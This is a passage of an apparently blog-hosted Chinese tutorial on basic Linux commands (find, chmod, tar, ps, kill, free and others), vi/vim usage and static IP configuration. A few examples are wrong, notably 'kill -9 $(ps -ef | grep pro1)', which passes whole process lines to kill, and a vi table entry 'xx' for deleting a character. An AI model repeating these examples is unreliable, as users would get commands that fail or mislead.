class="built_in">tail</span> -f ping.log 循环读取ping.log文件的更新</span><br><span class="line">ping 127.0.0.1 &gt; ping.log &amp; 将ping命令的输出重定向到ping.log文件并在后台运行</span><br><span class="line"><span class="built_in">tail</span> -f 文本文件 表示通过流的方式实时查看最新的文件内容</span><br></pre></td></tr></table></figure></li><li><p><code>which</code>、<code>whereis</code>、<code>locate</code>、<code>find</code>命令：查找文件。</p><ul><li><code>which</code>：查找可执行文件的位置。</li><li><code>whereis</code>：查找文件的位置，包括二进制文件、源代码文件、帮助文件等。</li><li><code>locate</code>：基于数据库快速查找文件，数据库由<code>updatedb</code>更新。</li><li><code>find</code>：在文件系统中查找文件，并可执行相关操作。</li></ul><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> <span class="built_in">ls</span> 查找<span class="built_in">ls</span>命令的可执行文件位置</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">which</span> 查找<span class="built_in">which</span>命令的可执行文件位置（可能不存在，因为<span class="built_in">which</span>是内置命令）</span><br><span class="line"><span class="built_in">which</span> <span class="built_in">cd</span> 查找<span class="built_in">cd</span>命令的位置（通常显示不存在，因为<span class="built_in">cd</span>是shell内置命令）</span><br><span class="line">whereis locate 查找locate程序的二进制文件、源代码文件和帮助文件</span><br><span class="line">whereis -s locate 查找locate的源代码文件</span><br><span class="line">whereis -m locate 查找locate的帮助文件</span><br><span class="line">locate <span class="built_in">pwd</span> 查找文件名中包含<span class="built_in">pwd</span>的所有文件</span><br><span class="line">locate /etc/sh 查找/etc目录下以sh开头的文件</span><br><span class="line">locate -r <span class="string">&#x27;^/var.*reason$&#x27;</span> 查找/var目录下以reason结尾的文件</span><br><span class="line">find /opt -perm 777 查找/opt目录下权限为777的文件</span><br><span class="line">find -size +1000c 查找大于1000字节的文件</span><br><span class="line">find -name <span class="string">&#x27;*.log&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \; 查找并删除当前目录及其子目录下所有以.<span class="built_in">log</span>结尾的文件</span><br></pre></td></tr></table></figure></li><li><p><code>chmod</code>命令：更改文件或目录的访问权限。</p><p>权限表示方法：</p><ul><li><code>r</code>：读权限，值为4</li><li><code>w</code>：写权限，值为2</li><li><code>x</code>：执行权限，值为1</li><li><code>-</code>：无权限，值为0</li></ul><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x t.log 为所有用户添加执行权限</span><br><span class="line"><span class="built_in">chmod</span> u=r t.log 设置文件属主具有读权限</span><br><span class="line"><span class="built_in">chmod</span> 751 t.log 设置属主具有读写执行权限，属组具有读执行权限，其他用户具有执行权限</span><br><span class="line"><span class="built_in">chmod</span> u+r,g+r,o+r -R text/ 为text目录及其子目录中的所有文件添加读权限</span><br></pre></td></tr></table></figure></li><li><p><code>tar</code>命令：用于文件的打包和压缩。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-c 创建新的压缩文件</span><br><span class="line">-f 指定压缩文件</span><br><span class="line">-r 追加文件到压缩文件</span><br><span class="line">-u 追加修改过的文件到压缩文件</span><br><span class="line">-x 解压文件</span><br><span class="line">-t 显示压缩文件中的内容</span><br><span class="line">-z 支持gzip压缩</span><br><span class="line">-j 支持bzip2压缩</span><br><span class="line">-v 显示操作过程</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf log.tar 1.<span class="built_in">log</span> 2.<span class="built_in">log</span> 将1.<span class="built_in">log</span>和2.<span class="built_in">log</span>打包成log.tar</span><br><span class="line">tar -zcvf /tmp/etc.tar.gz /etc 将/etc目录打包并使用gzip压缩，保存为/tmp/etc.tar.gz</span><br><span class="line">tar -ztvf /tmp/etc.tar.gz 查看压缩文件内容</span><br><span class="line">tar --exclude /home/dmtsai -zcvf myfile.tar.gz /home/* /etc 排除/home/dmtsai目录，打包压缩/home和/etc目录</span><br></pre></td></tr></table></figure></li><li><p><code>chown</code>命令：更改文件或目录的所有者和所属组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> [选项] 用户名:组名 文件名</span><br><span class="line">-c 显示更改信息</span><br><span class="line">-R 递归处理目录及其内容</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> -c mail:mail log2012.log 更改log2012.log的所有者和组为mail，并显示更改信息</span><br><span class="line"><span class="built_in">chown</span> -c :mail t.log 仅更改文件组为mail</span><br><span class="line"><span class="built_in">chown</span> -cR mail: <span class="built_in">test</span>/ 更改<span class="built_in">test</span>目录及其子目录的所有者和组为mail</span><br></pre></td></tr></table></figure></li><li><p><code>df</code>命令：显示磁盘空间使用情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> [选项]</span><br><span class="line">-a 显示所有文件系统</span><br><span class="line">-h 以易读方式显示</span><br><span class="line">-i 显示inode信息</span><br><span class="line">-k 以KB为单位显示</span><br><span class="line">-l 仅显示本地文件系统</span><br><span class="line">-T 显示文件系统类型</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -l 显示本地文件系统的磁盘使用情况</span><br><span class="line"><span class="built_in">df</span> -haT 以易读方式显示所有文件系统及其类型</span><br></pre></td></tr></table></figure></li><li><p><code>du</code>命令：查看文件或目录的磁盘使用情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> [选项] 文件或目录</span><br><span class="line">-a 显示所有文件大小</span><br><span class="line">-k 以KB为单位显示</span><br><span class="line">-m 以MB为单位显示</span><br><span class="line">-g 以GB为单位显示</span><br><span class="line">-h 以易读方式显示</span><br><span class="line">-s 仅显示总计</span><br><span class="line">-c 显示总计</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">du</span> -h scf/ 查看scf目录及其子目录的大小</span><br><span class="line"><span class="built_in">du</span> -ah scf/ 查看scf目录中所有文件的大小</span><br><span class="line"><span class="built_in">du</span> -hc <span class="built_in">test</span>/ scf/ 查看<span class="built_in">test</span>和scf目录及其子目录的大小，并显示总和</span><br><span class="line"><span class="built_in">du</span> -hc --max-depth=1 scf/ 查看scf目录及其一级子目录的大小，并显示总和</span><br></pre></td></tr></table></figure></li><li><p><code>ln</code>命令：创建链接文件。</p><p>链接类型：</p><ul><li>软链接：类似Windows快捷方式，可跨文件系统，可对不存在的文件创建，可对目录创建。</li><li>硬链接：以文件副本形式存在，不占额外空间，不允许对目录创建，仅限同一文件系统。</li></ul><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-s 创建软链接</span><br><span class="line">-v 显示详细信息</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sv source.log link.log 创建source.log的软链接link.log，并显示详细信息</span><br><span class="line"><span class="built_in">ln</span> -v source.log link1.log 创建source.log的硬链接link1.log，并显示详细信息</span><br><span class="line"><span class="built_in">ln</span> -sv /opt/soft/test/test3 /opt/soft/test/test5 创建目录的软链接</span><br></pre></td></tr></table></figure></li><li><p><code>date</code>命令：显示或设置系统日期和时间。</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> +%Y%m%d --<span class="built_in">date</span>=<span class="string">&quot;+1 day&quot;</span> 显示明天的日期</span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&quot;nov 22&quot;</span> 显示今年11月22日是星期几</span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&#x27;2 weeks&#x27;</span> 显示两周后的日期</span><br><span class="line"><span class="built_in">date</span> -d <span class="string">&#x27;next monday&#x27;</span> 显示下周一的日期</span><br><span class="line"><span class="built_in">date</span> -d next-day +%Y%m%d 或 <span class="built_in">date</span> -d tomorrow +%Y%m%d 显示明天的日期</span><br><span class="line"><span class="built_in">date</span> -d last-day +%Y%m%d 显示昨天的日期</span><br><span class="line"><span class="built_in">date</span> -d last-month +%Y%m 显示上个月的月份</span><br><span class="line"><span class="built_in">date</span> -d next-month +%Y%m 显示下个月的月份</span><br></pre></td></tr></table></figure></li><li><p><code>cal</code>命令：显示日历。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-3 显示前一月、当前月、后一月的三个月日历</span><br><span class="line">-m 显示星期一为一周的第一天</span><br><span class="line">-j 显示当前年中的第几天</span><br><span class="line">-y 显示整年的日历</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cal 9 2012 显示2012年9月的日历</span><br><span class="line">cal -y 2013 显示2013年全年的日历</span><br><span class="line">cal -3m 显示三个月的日历，以星期一为一周的第一天</span><br></pre></td></tr></table></figure></li><li><p><code>grep</code>命令：在文件中搜索指定的字符串。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-A n 显示匹配行之后的n行</span><br><span class="line">-B n 显示匹配行之前的n行</span><br><span class="line">-C n 显示匹配行前后各n行</span><br><span class="line">-c 计算匹配行数</span><br><span class="line">-i 忽略大小写</span><br><span class="line">-l 仅列出包含匹配行的文件名</span><br><span class="line">-n 显示行号</span><br><span class="line">-R 递归搜索目录</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="built_in">test</span> *file 查找当前目录中文件名包含file的文件，并显示包含<span class="built_in">test</span>字符串的行</span><br><span class="line">grep -r update /etc/acpi 查找/etc/acpi目录及其子目录中包含update字符串的文件</span><br><span class="line">grep -v <span class="built_in">test</span> *<span class="built_in">test</span>* 查找文件名包含<span class="built_in">test</span>的文件中不包含<span class="built_in">test</span>字符串的行</span><br><span class="line">grep -E <span class="string">&#x27;ed|at&#x27;</span> test.txt 查找test.txt文件中包含ed或at的行</span><br></pre></td></tr></table></figure></li><li><p><code>wc</code>命令：统计文件中的行数、单词数和字节数。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-c 统计字节数</span><br><span class="line">-l 统计行数</span><br><span class="line">-m 统计字符数</span><br><span class="line">-w 统计单词数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> text.txt 查看text.txt文件的行数、单词数和字节数</span><br><span class="line"><span class="built_in">cat</span> test.txt | <span class="built_in">wc</span> -l 查看test.txt文件的行数</span><br></pre></td></tr></table></figure></li><li><p><code>ps</code>命令：查看当前运行的进程状态。</p><p>Linux进程状态：</p><p>|状态码|状态名称|说明|<br>|—-|—-|—-|<br>|D|不可中断|进程处于等待状态，如等待IO操作完成，无法被中断|<br>|R|运行|进程处于运行队列中，等待CPU时间片或正在运行|<br>|S|中断|进程处于休眠状态，等待某个事件发生|<br>|T|停止|进程被停止，如通过调试信号或暂停命令|<br>|Z|僵死|进程已终止，但父进程尚未回收其资源|</p><p>常用选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-A 显示所有进程</span><br><span class="line">-a 显示同一终端下的进程</span><br><span class="line">-u 显示用户相关进程</span><br><span class="line">-x 显示没有控制终端的进程</span><br><span class="line">-aux 显示所有包含其他用户使用的进程</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef 显示当前所有进程的详细信息</span><br><span class="line">ps -A 显示所有进程</span><br><span class="line">ps -aux | grep apache 查找与apache相关的进程</span><br><span class="line">ps aux | grep <span class="string">&#x27;(cron|syslog)&#x27;</span> 查找与cron或syslog相关的进程</span><br></pre></td></tr></table></figure></li><li><p><code>top</code>命令：实时显示系统中各个进程的资源使用情况。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-c 显示完整的进程命令</span><br><span class="line">-s 保密模式</span><br><span class="line">-p &lt;进程号&gt; 指定进程显示</span><br><span class="line">-n &lt;次数&gt; 循环显示次数</span><br></pre></td></tr></table></figure><p>交互命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">h 显示帮助信息</span><br><span class="line">c 切换显示命令名称和完整命令行</span><br><span class="line">m 按内存使用率排序</span><br><span class="line">P 按CPU使用率排序</span><br><span class="line">T 按时间/累计时间排序</span><br><span class="line">W 将当前设置保存到~/.toprc文件</span><br><span class="line">o 或 O 改变显示项目的顺序</span><br></pre></td></tr></table></figure></li><li><p><code>kill</code>命令：向进程发送信号，终止或控制进程。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l 列出所有信号名称</span><br><span class="line">-a 不限制命令名和进程号的关系</span><br><span class="line">-p 仅打印进程号而不发送信号</span><br><span class="line">-s 指定发送的信号</span><br><span class="line">-u 指定用户</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 $(ps -ef | grep pro1) 查找并强制终止名为pro1的进程</span><br></pre></td></tr></table></figure></li><li><p><code>free</code>命令：显示系统内存使用情况。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-b 以字节显示</span><br><span class="line">-k 以KB显示</span><br><span class="line">-m 以MB显示</span><br><span class="line">-g 以GB显示</span><br><span class="line">-s &lt;间隔秒数&gt; 持续显示</span><br><span class="line">-t 显示总和</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free 显示内存使用情况</span><br><span class="line">free -k 以KB显示内存使用情况</span><br><span class="line">free -m 以MB显示内存使用情况</span><br><span class="line">free -t 显示内存使用的总和信息</span><br><span class="line">free -s 10 每10秒显示一次内存使用情况</span><br></pre></td></tr></table></figure></li></ul><h2 id="五：文本编辑器vi的使用"><a href="#五：文本编辑器vi的使用" class="headerlink" title="五：文本编辑器vi的使用"></a>五：文本编辑器vi的使用</h2><h3 id="文本文件的创建"><a href="#文本文件的创建" class="headerlink" title="文本文件的创建"></a>文本文件的创建</h3><p>在Linux上可以通过以下方式创建文件：</p><ol><li><p>使用重定向符（<code>&gt;</code>）创建空文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; test.txt</span><br></pre></td></tr></table></figure></li><li><p>使用<code>touch</code>命令创建文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> test2.txt</span><br></pre></td></tr></table></figure></li><li><p>使用<code>echo</code>命令创建包含内容的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;111&quot;</span> &gt; test3.txt</span><br></pre></td></tr></table></figure><p>或：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; test6.txt &lt;&lt; <span class="string">end</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>cat</code>命令创建文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; test4.txt</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">333^C</span><br></pre></td></tr></table></figure></li><li><p>使用<code>vi/vim</code>命令创建文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi test5.txt</span><br></pre></td></tr></table></figure></li></ol><p>关于vi/vim的详细使用方法，参考：<a href="https://www.runoob.com/linux/linux-vim.html">https://www.runoob.com/linux/linux-vim.html</a>  </p><h3 id="vi-vim使用概述"><a href="#vi-vim使用概述" class="headerlink" title="vi/vim使用概述"></a>vi/vim使用概述</h3><p>vi/vim是一个功能强大的文本编辑器，主要用于编辑纯文本文件。它具有三种模式：命令模式、输入模式和底线命令模式。</p><ul><li><p><strong>命令模式</strong>：用于执行各种编辑命令，如移动光标、删除字符、进入其他模式等。默认情况下，启动vi后即进入命令模式。</p><p>常用命令：</p><p>|命令|说明|<br>|—-|—-|<br>|i|进入输入模式，在当前光标位置开始输入|<br>|x|删除当前光标所在处的字符|<br>|:|进入底线命令模式|</p></li><li><p><strong>输入模式</strong>：用于输入文本。在命令模式下按<code>i</code>、<code>o</code>、<code>a</code>等键可进入输入模式。</p><p>常用操作：</p><p>|按键|功能|<br>|—-|—-|<br>|字符按键及Shift组合|输入字符|<br>|Enter|换行|<br>|Backspace|删除光标前一个字符|<br>|Del|删除光标后一个字符|<br>|方向键|移动光标|<br>|Home/End|移动光标到行首/行尾|<br>|Page Up/Page Down|上/下翻页|<br>|Insert|切换输入/替换模式|<br>|ESC|退出输入模式，返回命令模式|</p></li><li><p><strong>底线命令模式</strong>：用于执行更复杂的命令，如保存文件、退出编辑器等。在命令模式下按<code>:</code>进入。</p><p>常用命令：</p><p>|命令|说明|<br>|—-|—-|<br>|q|退出vi|<br>|w|保存文件|<br>|wq|保存并退出|<br>|q!|强制退出，不保存修改|</p></li></ul><h3 id="vi-vim使用实例"><a href="#vi-vim使用实例" class="headerlink" title="vi/vim使用实例"></a>vi/vim使用实例</h3><ol><li><p>使用<code>vi</code>创建文件<code>runoob.txt</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi runoob.txt</span><br></pre></td></tr></table></figure></li><li><p>按<code>i</code>进入输入模式，开始编辑文件内容。</p></li><li><p>输入完成后，按<code>ESC</code>返回命令模式。</p></li><li><p>输入<code>:wq</code>保存并退出vi。</p></li></ol><h3 id="vi-vim按键说明"><a href="#vi-vim按键说明" class="headerlink" title="vi/vim按键说明"></a>vi/vim按键说明</h3><h4 id="命令模式下的光标移动和文本编辑"><a href="#命令模式下的光标移动和文本编辑" class="headerlink" title="命令模式下的光标移动和文本编辑"></a>命令模式下的光标移动和文本编辑</h4><div class="table-container"><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>h或左箭头</td><td>光标左移</td></tr><tr><td>j或下箭头</td><td>光标下移</td></tr><tr><td>k或上箭头</td><td>光标上移</td></tr><tr><td>l或右箭头</td><td>光标右移</td></tr><tr><td>Ctrl+f</td><td>向下移动一页</td></tr><tr><td>Ctrl+b</td><td>向上移动一页</td></tr><tr><td>Ctrl+d</td><td>向下移动半页</td></tr><tr><td>Ctrl+u</td><td>向上移动半页</td></tr><tr><td>+</td><td>移动到非空白字符的下一行</td></tr><tr><td>-</td><td>移动到非空白字符的上一行</td></tr><tr><td>0（数字0）或Home</td><td>移动到行首</td></tr><tr><td>$或End</td><td>移动到行尾</td></tr><tr><td>H</td><td>移动到屏幕第一行</td></tr><tr><td>M</td><td>移动到屏幕中间行</td></tr><tr><td>L</td><td>移动到屏幕最后一行</td></tr><tr><td>G</td><td>移动到文件最后一行</td></tr><tr><td>nG（n为数字）</td><td>移动到文件第n行</td></tr><tr><td>gg</td><td>移动到文件第一行</td></tr><tr><td>n（数字）</td><td>向右移动n个字符</td></tr><tr><td>/word</td><td>向下搜索word字符串</td></tr><tr><td>?word</td><td>向上搜索word字符串</td></tr><tr><td>n</td><td>重复前一个搜索</td></tr><tr><td>N</td><td>反向重复前一个搜索</td></tr><tr><td>:n1,n2s/old/new/g</td><td>在n1到n2行之间替换old为new</td></tr><tr><td>:1,$s/old/new/g</td><td>替换整个文件中的old为new</td></tr><tr><td>:1,$s/old/new/gc</td><td>替换整个文件中的old为new，并确认</td></tr><tr><td>xx</td><td>删除光标所在处的字符</td></tr><tr><td>nx</td><td>删除光标后n个字符</td></tr><tr><td>dd</td><td>删除光标所在行</td></tr><tr><td>ndd</td><td>删除光标后n行</td></tr><tr><td>d1G</td><td>删除从光标到文件第一行的内容</td></tr><tr><td>dG</td><td>删除从光标到文件最后一行的内容</td></tr><tr><td>d$</td><td>删除从光标到行尾的内容</td></tr><tr><td>d0</td><td>删除从光标到行首的内容</td></tr><tr><td>yy</td><td>复制光标所在行</td></tr><tr><td>nyy</td><td>复制光标后n行</td></tr><tr><td>y1G</td><td>复制从光标所在行到文件第一行的内容</td></tr><tr><td>yG</td><td>复制从光标所在行到文件最后一行的内容</td></tr><tr><td>y0</td><td>复制从光标到行首的内容</td></tr><tr><td>y$</td><td>复制从光标到行尾的内容</td></tr><tr><td>p/P</td><td>在光标下/上一行粘贴</td></tr><tr><td>J</td><td>合并光标所在行与下一行</td></tr><tr><td>u</td><td>撤销上次操作</td></tr><tr><td>Ctrl+r</td><td>重做上次操作</td></tr><tr><td>.（点）</td><td>重复上次编辑命令</td></tr></tbody></table></div><h4 id="进入输入模式的命令"><a href="#进入输入模式的命令" class="headerlink" title="进入输入模式的命令"></a>进入输入模式的命令</h4><div class="table-container"><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>i</td><td>在当前光标位置开始输入</td></tr><tr><td>I</td><td>在当前行的第一个非空白字符处开始输入</td></tr><tr><td>a</td><td>在当前光标后的下一个字符处开始输入</td></tr><tr><td>A</td><td>在当前行的末尾开始输入</td></tr><tr><td>o</td><td>在当前光标行的下一行插入新行并进入输入模式</td></tr><tr><td>O</td><td>在当前光标行的上一行插入新行并进入输入模式</td></tr><tr><td>r/R</td><td>替换模式，r替换光标所在处的一个字符，R持续替换直至按ESC退出</td></tr></tbody></table></div><h4 id="底线命令模式的命令"><a href="#底线命令模式的命令" class="headerlink" title="底线命令模式的命令"></a>底线命令模式的命令</h4><div class="table-container"><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>q</td><td>退出vi</td></tr><tr><td>w</td><td>保存文件</td></tr><tr><td>wq</td><td>保存并退出</td></tr><tr><td>q!</td><td>强制退出，不保存修改</td></tr><tr><td>w filename</td><td>将编辑的内容保存为指定的文件名</td></tr><tr><td>r filename</td><td>读取指定文件的内容并插入到当前光标位置</td></tr><tr><td>n1,n2 w filename</td><td>将n1到n2行的内容保存到指定文件</td></tr><tr><td>! command</td><td>执行shell命令</td></tr><tr><td>set nu</td><td>显示行号</td></tr><tr><td>set nonu</td><td>取消显示行号</td></tr></tbody></table></div><h3 id="使用vi修改IP地址为静态IP"><a href="#使用vi修改IP地址为静态IP" class="headerlink" title="使用vi修改IP地址为静态IP"></a>使用vi修改IP地址为静态IP</h3><ol><li><p>查看默认网关：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default via 192.168.2.1 dev ens33 proto static metric 100 </span><br><span class="line">192.168.2.0/24 dev ens33 proto kernel scope <span class="built_in">link</span> src 192.168.2.112 metric 100 </span><br></pre></td></tr></table></figure><p>网关地址为<code>192.168.2.1</code>。</p></li><li><p>查看动态IP地址及网段信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:e2:e2:23 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.2.112/24 brd 192.168.2.255 scope global noprefixroute ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::c94b:6002:cc54:64ca/64 scope <span class="built_in">link</span> noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure></li><li><p>使用vi编辑网卡配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure><p>将内容修改为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">TYPE=<span class="string">&quot;Ethernet&quot;</span></span><br><span 